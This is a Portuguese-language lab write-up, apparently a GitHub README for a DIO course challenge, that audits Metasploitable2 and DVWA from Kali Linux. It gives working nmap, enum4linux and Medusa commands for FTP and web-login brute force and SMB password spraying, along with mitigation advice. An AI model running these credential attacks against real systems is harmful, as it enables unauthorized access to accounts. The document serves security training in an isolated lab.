🛡️ Projeto: Auditoria de Segurança com Kali Linux, Medusa e Ambientes Vulneráveis

Este repositório contém a implementação prática do desafio proposto pela DIO, abordando técnicas de ataques de força bruta, enumeração, testes de intrusão em serviços vulneráveis e boas práticas de documentação técnica para portfólio.

O foco do projeto é demonstrar o uso do Kali Linux, da ferramenta Medusa e de ambientes vulneráveis como Metasploitable2 e DVWA, simulando cenários reais de auditoria de segurança em um laboratório controlado.

📌 Sumário

📘 Objetivo do Projeto

🧪 Cenários Implementados

🧰 Ferramentas Utilizadas

🖥️ Configuração do Ambiente

🚀 Testes e Ataques Simulados

1️⃣ Validação de Conectividade

2️⃣ Enumeração de Serviços com Nmap

3️⃣ Brute Force em FTP com Medusa

4️⃣ Automação de Login DVWA com Medusa

5️⃣ Password Spraying em SMB

📝 Recomendações de Mitigação

📂 Estrutura do Repositório

📎 Links de Documentação Oficial

⬇️ Downloads Úteis

📚 Licença

📘 Objetivo do Projeto

Ao concluir o projeto, o estudante demonstra capacidade de:

✔️ Entender ataques de força bruta (FTP, Web, SMB)
✔️ Utilizar Kali Linux e Medusa em auditorias de segurança
✔️ Documentar processos técnicos de forma clara e profissional
✔️ Reconhecer vulnerabilidades e propor medidas de mitigação
✔️ Versionar e publicar documentação no GitHub como portfólio técnico

🧪 Cenários Implementados

Os seguintes testes foram realizados:

Ataque de força bruta em FTP

Ataque automatizado em formulário de login DVWA

Password spraying + enumeração de usuários em SMB

Geração de wordlists simples

Coleta de evidências de acesso

Todos os testes foram executados em um laboratório isolado, com propósito exclusivamente educacional.

🧰 Ferramentas Utilizadas
Ferramenta	Finalidade
Kali Linux	SO para testes de segurança
Medusa	Brute force multiprotocolo
Metasploitable2	Máquina vulnerável
DVWA	Aplicação web vulnerável
Nmap	Enumeração de portas e serviços
enum4linux	Enumeração para SMB
smbclient	Validação de acesso SMB
VirtualBox	Virtualização do laboratório
🖥️ Configuração do Ambiente

As duas máquinas virtuais foram configuradas no VirtualBox utilizando rede:

Host-Only Adapter (192.168.56.0/24)


Kali Linux → Atacante

Metasploitable2 → Alvo

DVWA executado via Apache no Metasploitable

🚀 Testes e Ataques Simulados
1️⃣ Validação de Conectividade
ping <ip_host>


Verifica latência e conectividade ICMP com o alvo.

2️⃣ Enumeração de Serviços com Nmap
nmap -sV -p 21,22,80,445,139 <ip_host>


-sV → identifica versões dos serviços

Verificação focada em portas vulneráveis (FTP/SSH/HTTP/SMB)

3️⃣ Brute Force em FTP com Medusa
Wordlists utilizadas:
echo -e "user\nmsfadmin\nadmin\nroot" > users.txt
echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt

Ataque:
medusa -h <ip_host> -U users.txt -P pass.txt -M ftp -t 6


-M ftp → módulo FTP

-t 6 → threads paralelas

4️⃣ Automação de Login DVWA com Medusa

Acesso manual:

http://<ip_host>/dvwa/login.php


Ataque HTTP:

medusa -h <ip_host> -U users.txt -P pass.txt -M http \
 -m PAGE:'/dvwa/login.php' \
 -m FORM:'username=^USER^&password=^PASS^&Login=Login' \
 -m 'FAIL=Login failed' -t 6


Simula login web com POST

Detecta falha por string Login failed

5️⃣ Password Spraying em SMB
Enumeração:
enum4linux -a <ip_host> | tee enum4_output.txt
less enum4_output.txt

Wordlists refinadas:
echo -e "user\nmsfadmin\nservice" > smb_users.txt
echo -e "password\n123456\nWelcome123\nmsfadmin" > senhas_spray.txt

Ataque SMB:
medusa -h <ip_host> -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50

Validação após acesso:
smbclient -L //<ip_host> -U msfadmin

📝 Recomendações de Mitigação

Implementar limitação de tentativas de login

Utilizar bloqueio automático por IP

Habilitar MFA em sistemas críticos

Utilizar senhas fortes e políticas de complexidade

Desabilitar serviços desnecessários (ex.: FTP sem TLS)

Monitoramento contínuo via SIEM

📂 Estrutura do Repositório
/
├── README.md
├── users.txt
├── pass.txt
├── smb_users.txt
├── senhas_spray.txt
├── enum4_output.txt
└── /images   (opcional)

📎 Links de Documentação Oficial

Kali Linux – https://www.kali.org/docs/

Medusa – http://foofus.net/goons/jmk/medusa/medusa.html

DVWA – https://github.com/digininja/DVWA

Nmap Manual – https://nmap.org/book/man.html

enum4linux – https://github.com/cddmp/enum4linux-ng

GitHub Docs – https://docs.github.com

Markdown Guide – https://www.markdownguide.org/basic-syntax/

⬇️ Downloads Úteis
Ferramenta	Download
Kali Linux	https://www.kali.org/get-kali/

Metasploitable 2	https://sourceforge.net/projects/metasploitable/files/Metasploitable2/

VirtualBox	https://www.virtualbox.org/wiki/Downloads
📚 Licença

Projeto desenvolvido para fins educacionais.
Distribuído sob licença MIT.
